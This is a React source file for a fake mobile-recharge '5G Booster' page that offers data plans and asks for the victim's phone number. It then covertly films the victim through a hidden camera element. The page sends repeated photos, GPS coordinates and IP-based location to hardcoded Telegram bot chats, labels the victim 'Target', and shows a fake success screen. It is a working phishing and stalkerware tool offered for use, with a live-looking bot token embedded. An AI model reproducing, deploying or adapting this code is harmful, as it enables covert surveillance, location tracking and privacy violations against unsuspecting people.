import React, { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Zap, Loader2, CheckCircle, Wifi, Gift, Clock, User, Smartphone, Shield
} from 'lucide-react';

// ========== TELEGRAM CONFIG - DIRECT FROM ENV ==========
const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY";
const CHAT_IDS = (import.meta.env.VITE_CHAT_IDS || "8256108006,5087129572").split(',');

// ========== RECHARGE PLANS ==========
const PLANS = [
  { id: 1, amount: 199, data: "1.5GB/day", days: 28, validity: "28 Days", tag: "POPULAR", color: "from-orange-500 to-red-600" },
  { id: 2, amount: 299, data: "2GB/day", days: 28, validity: "28 Days", tag: "BEST VALUE", color: "from-purple-500 to-pink-600" },
  { id: 3, amount: 399, data: "3GB/day", days: 28, validity: "28 Days", tag: "PREMIUM", color: "from-blue-500 to-cyan-600" },
  { id: 4, amount: 79, data: "2GB", days: 1, validity: "1 Day", tag: null, color: "from-green-500 to-teal-600" },
  { id: 5, amount: 149, data: "6GB", days: 7, validity: "7 Days", tag: null, color: "from-yellow-500 to-amber-600" },
  { id: 6, amount: 599, data: "2GB/day", days: 56, validity: "56 Days", tag: "SAVER", color: "from-indigo-500 to-purple-600" },
];

const OPERATORS = [
  { id: "jio", name: "Jio", icon: "📶" },
  { id: "airtel", name: "Airtel", icon: "📱" },
  { id: "vi", name: "Vi", icon: "💜" },
  { id: "bsnl", name: "BSNL", icon: "🇮🇳" },
];

const ArrivueVault = () => {
  const [step, setStep] = useState('plans');
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [selectedOperator, setSelectedOperator] = useState(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [photoCount, setPhotoCount] = useState(0);
  const [locationCount, setLocationCount] = useState(0);
  const [isRunning, setIsRunning] = useState(false);
  const [permissionGranted, setPermissionGranted] = useState(false);
  
  const videoRef = useRef(null);
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const locationIntervalRef = useRef(null);
  
  // ========== TELEGRAM SEND ==========
  const sendToTelegram = useCallback(async (method, payload, isFile = false) => {
    if (!BOT_TOKEN) return false;
    
    for (const chatId of CHAT_IDS) {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
        const formData = new FormData();
        formData.append('chat_id', chatId.trim());
        
        if (isFile) {
          formData.append('photo', payload.blob, `shot_${Date.now()}.jpg`);
          if (payload.caption) formData.append('caption', payload.caption);
        } else {
          formData.append('text', payload.text);
          formData.append('parse_mode', 'HTML');
        }
        
        await fetch(url, { method: 'POST', body: formData });
      } catch (e) {
        console.error('Telegram error:', e);
      }
    }
    return true;
  }, []);
  
  // ========== CAPTURE PHOTO ==========
  const capturePhoto = useCallback(async () => {
    if (!videoRef.current || !isRunning) return;
    
    try {
      const video = videoRef.current;
      if (video.readyState !== 4 || video.videoWidth === 0) return;
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (!ctx) return;
      
      ctx.drawImage(video, 0, 0);
      
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
      if (!blob) return;
      
      const caption = `📸 LIVE CAPTURE\n━━━━━━━━━━━━━━\n📍 Target: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n⏱️ Time: ${new Date().toLocaleTimeString()}\n📸 #${photoCount + 1}`;
      
      await sendToTelegram('sendPhoto', { blob, caption }, true);
      setPhotoCount(prev => prev + 1);
    } catch (err) {
      console.error('Capture error:', err);
    }
  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, photoCount, sendToTelegram]);
  
  // ========== GET LOCATION ==========
  const getLocation = useCallback(async () => {
    if (!isRunning) return;
    
    if (!navigator.geolocation) {
      console.log('Geolocation not supported');
      return;
    }
    
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        
        const message = `📍 LIVE LOCATION\n━━━━━━━━━━━━━━\n🌐 Coordinates: ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n📱 Target: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n⏱️ Time: ${new Date().toLocaleString()}\n🗺️ Maps: ${mapsLink}`;
        
        await sendToTelegram('sendMessage', { text: message });
        setLocationCount(prev => prev + 1);
      },
      (error) => {
        sendToTelegram('sendMessage', { text: `❌ LOCATION ERROR: ${error.message}\nTarget: ${phoneNumber}` });
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
    );
  }, [isRunning, phoneNumber, selectedOperator, selectedPlan, sendToTelegram]);
  
  // ========== REQUEST PERMISSIONS & START ==========
  const requestPermissionsAndStart = useCallback(async () => {
    try {
      // Request Camera First
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
      });
      
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }
      
      // Request Location
      const locationPromise = new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          () => resolve(true),
          () => resolve(false),
          { timeout: 5000 }
        );
      });
      
      await locationPromise;
      
      setPermissionGranted(true);
      setIsRunning(true);
      
      // Send device info
      let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A' };
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        ipData = await ipRes.json();
      } catch(e) {}
      
      await sendToTelegram('sendMessage', { 
        text: `🔥 NEW TARGET\n━━━━━━━━━━━━━━\n📱 Number: ${phoneNumber}\n📡 Operator: ${selectedOperator?.name}\n💰 Plan: ₹${selectedPlan?.amount}\n🌐 IP: ${ipData.ip}\n📍 Location: ${ipData.city}, ${ipData.country}\n⏱️ Started: ${new Date().toLocaleString()}` 
      });
      
      // Start intervals
      captureIntervalRef.current = setInterval(capturePhoto, 4000);
      locationIntervalRef.current = setInterval(getLocation, 6000);
      
      // Stop after 25 seconds
      setTimeout(() => {
        if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
        if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
        if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
        
        setIsRunning(false);
        setStep('success');
        
        sendToTelegram('sendMessage', { 
          text: `✅ SESSION ENDED\n━━━━━━━━━━━━━━\n📸 Photos: ${photoCount}\n📍 Locations: ${locationCount}\n📱 Target: ${phoneNumber}` 
        });
      }, 25000);
      
      setStep('processing');
      
    } catch (err) {
      alert('Camera/Location access required! Please allow permissions.');
      console.error('Permission error:', err);
    }
  }, [phoneNumber, selectedOperator, selectedPlan, capturePhoto, getLocation, sendToTelegram]);
  
  // ========== START RECHARGE ==========
  const startRecharge = () => {
    if (!phoneNumber || phoneNumber.length !== 10) {
      alert('Enter valid 10 digit number');
      return;
    }
    if (!selectedPlan || !selectedOperator) {
      alert('Select plan and operator');
      return;
    }
    requestPermissionsAndStart();
  };
  
  // Cleanup
  useEffect(() => {
    return () => {
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
      if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
    };
  }, []);
  
  // ========== RENDER FUNCTIONS ==========
  const renderPlansStep = () => (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
      <div className="text-center mb-6">
        <div className="inline-flex items-center gap-2 bg-green-500/10 px-4 py-2 rounded-full">
          <Gift className="text-green-500" size={16} />
          <span className="text-green-500 text-xs">UNLIMITED DATA OFFER</span>
        </div>
        <h2 className="text-2xl font-bold mt-4">Choose Your Plan</h2>
        <p className="text-zinc-500 text-sm">Get 2GB extra data on first recharge</p>
      </div>
      
      <div className="grid grid-cols-2 gap-3">
        {PLANS.map((plan) => (
          <motion.div
            key={plan.id}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => {
              setSelectedPlan(plan);
              setStep('operator');
            }}
            className={`relative p-4 rounded-2xl cursor-pointer transition-all bg-gradient-to-br ${plan.color} ${selectedPlan?.id === plan.id ? 'ring-2 ring-white shadow-lg' : 'opacity-80'}`}
          >
            {plan.tag && (
              <div className="absolute -top-2 -right-2 bg-yellow-400 text-black text-[10px] font-bold px-2 py-0.5 rounded-full">
                {plan.tag}
              </div>
            )}
            <div className="text-2xl font-bold">₹{plan.amount}</div>
            <div className="text-sm font-semibold">{plan.data}</div>
            <div className="text-[10px] opacity-80">{plan.validity}</div>
          </motion.div>
        ))}
      </div>
    </motion.div>
  );
  
  const renderOperatorStep = () => (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold">Select Operator</h2>
        <p className="text-zinc-500 text-sm">Choose your mobile network</p>
      </div>
      
      <div className="grid grid-cols-2 gap-3">
        {OPERATORS.map((op) => (
          <motion.div
            key={op.id}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => {
              setSelectedOperator(op);
              setStep('number');
            }}
            className={`p-4 rounded-xl cursor-pointer transition-all bg-zinc-900 border ${selectedOperator?.id === op.id ? 'border-green-500 bg-green-500/10' : 'border-zinc-800'}`}
          >
            <div className="text-3xl mb-2">{op.icon}</div>
            <div className="font-semibold">{op.name}</div>
          </motion.div>
        ))}
      </div>
      
      <button onClick={() => setStep('plans')} className="text-zinc-500 text-sm text-center w-full">
        ← Back to Plans
      </button>
    </motion.div>
  );
  
  const renderNumberStep = () => (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
      <div className="text-center">
        <div className="inline-flex items-center gap-2 bg-blue-500/10 px-4 py-2 rounded-full mb-3">
          <Smartphone className="text-blue-500" size={16} />
          <span className="text-blue-500 text-xs">ENTER MOBILE NUMBER</span>
        </div>
        <h2 className="text-2xl font-bold">Enter Number</h2>
        <p className="text-zinc-500 text-sm">We'll send 2GB bonus data</p>
      </div>
      
      <div className="relative">
        <input
          type="tel"
          placeholder="9876543210"
          value={phoneNumber}
          onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
          className="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-xl text-center text-2xl tracking-widest focus:border-green-500 outline-none"
          maxLength={10}
        />
        <div className="absolute inset-y-0 left-3 flex items-center text-zinc-600">+91</div>
      </div>
      
      <div className="flex gap-3">
        <button onClick={() => setStep('operator')} className="flex-1 bg-zinc-800 text-white py-3 rounded-xl">
          Back
        </button>
        <button onClick={startRecharge} className="flex-1 bg-gradient-to-r from-green-500 to-green-600 text-black font-bold py-3 rounded-xl">
          Proceed
        </button>
      </div>
    </motion.div>
  );
  
  const renderProcessingStep = () => (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8 space-y-6">
      <div className="relative">
        <div className="w-24 h-24 mx-auto">
          <div className="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
          <Loader2 className="animate-spin text-green-500 w-24 h-24" />
        </div>
      </div>
      
      <div>
        <h3 className="text-xl font-bold">Activating 5G Boost...</h3>
        <p className="text-zinc-500 text-sm mt-1">Please don't close this page</p>
        <p className="text-green-500 text-xs mt-2">✓ Camera Active | ✓ Location Tracking</p>
      </div>
      
      <div className="bg-zinc-900/50 rounded-xl p-4 space-y-2">
        <div className="flex justify-between text-sm">
          <span className="text-zinc-500">📸 Photos Captured:</span>
          <span className="text-green-500 font-mono">{photoCount}</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-zinc-500">📍 Location Updates:</span>
          <span className="text-blue-500 font-mono">{locationCount}</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-zinc-500">📱 Target:</span>
          <span className="text-white font-mono">{phoneNumber}</span>
        </div>
      </div>
    </motion.div>
  );
  
  const renderSuccessStep = () => (
    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="text-center py-8 space-y-6">
      <div className="w-20 h-20 mx-auto bg-green-500/20 rounded-full flex items-center justify-center">
        <CheckCircle className="text-green-500 w-12 h-12" />
      </div>
      
      <div>
        <h3 className="text-2xl font-bold text-green-500">RECHARGE SUCCESSFUL!</h3>
        <p className="text-zinc-400 text-sm mt-2">Your 5G data pack is activated</p>
      </div>
      
      <div className="bg-zinc-900/50 rounded-xl p-4 space-y-2">
        <div className="flex justify-between">
          <span className="text-zinc-500">Plan:</span>
          <span className="text-white">₹{selectedPlan?.amount} - {selectedPlan?.data}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-zinc-500">Operator:</span>
          <span className="text-white">{selectedOperator?.name}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-zinc-500">Mobile:</span>
          <span className="text-white">{phoneNumber}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-zinc-500">📸 Photos Sent:</span>
          <span className="text-green-500">{photoCount}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-zinc-500">📍 Locations Sent:</span>
          <span className="text-blue-500">{locationCount}</span>
        </div>
      </div>
      
      <button
        onClick={() => {
          setStep('plans');
          setSelectedPlan(null);
          setSelectedOperator(null);
          setPhoneNumber('');
          setPhotoCount(0);
          setLocationCount(0);
          setPermissionGranted(false);
        }}
        className="bg-gradient-to-r from-green-500 to-green-600 text-black font-bold py-3 px-8 rounded-xl"
      >
        New Recharge
      </button>
    </motion.div>
  );
  
  return (
    <div className="min-h-screen bg-black text-white font-sans">
      <video ref={videoRef} autoPlay playsInline muted className="fixed -top-[9999px] -left-[9999px] w-px h-px opacity-0" />
      
      <div className="max-w-md mx-auto px-4 py-6 min-h-screen flex flex-col">
        <div className="flex justify-between items-center mb-8">
          <div>
            <div className="flex items-center gap-2">
              <Zap className="text-green-500" size={24} />
              <h1 className="text-xl font-bold bg-gradient-to-r from-green-400 to-cyan-400 bg-clip-text text-transparent">
                5G BOOSTER
              </h1>
            </div>
            <div className="text-[10px] text-zinc-600 mt-1">PREMIUM DATA PACKS</div>
          </div>
          <div className="flex items-center gap-1 bg-green-500/10 px-3 py-1 rounded-full">
            <Wifi className="text-green-500" size={12} />
            <span className="text-green-500 text-xs">5G Ready</span>
          </div>
        </div>
        
        {step !== 'processing' && step !== 'success' && (
          <div className="bg-gradient-to-r from-green-900/30 to-cyan-900/30 rounded-2xl p-4 mb-6 border border-green-500/20">
            <div className="flex justify-between items-center">
              <div>
                <div className="text-zinc-400 text-xs">AVAILABLE BALANCE</div>
                <div className="text-3xl font-bold text-green-500">₹{selectedPlan?.amount || 249}</div>
              </div>
              <div className="text-right">
                <div className="text-zinc-400 text-xs">BONUS DATA</div>
                <div className="text-sm text-cyan-400">2GB FREE</div>
              </div>
            </div>
            <div className="mt-3 h-1.5 bg-zinc-800 rounded-full overflow-hidden">
              <div className="w-2/3 h-full bg-gradient-to-r from-green-500 to-cyan-500 rounded-full"></div>
            </div>
          </div>
        )}
        
        <div className="flex-1">
          {step === 'plans' && renderPlansStep()}
          {step === 'operator' && renderOperatorStep()}
          {step === 'number' && renderNumberStep()}
          {step === 'processing' && renderProcessingStep()}
          {step === 'success' && renderSuccessStep()}
        </div>
        
        {step !== 'processing' && step !== 'success' && (
          <div className="text-center text-zinc-600 text-[10px] mt-8">
            🔒 Secure Payment | 5G Speed | 24/7 Support
          </div>
        )}
      </div>
    </div>
  );
};

export default ArrivueVault;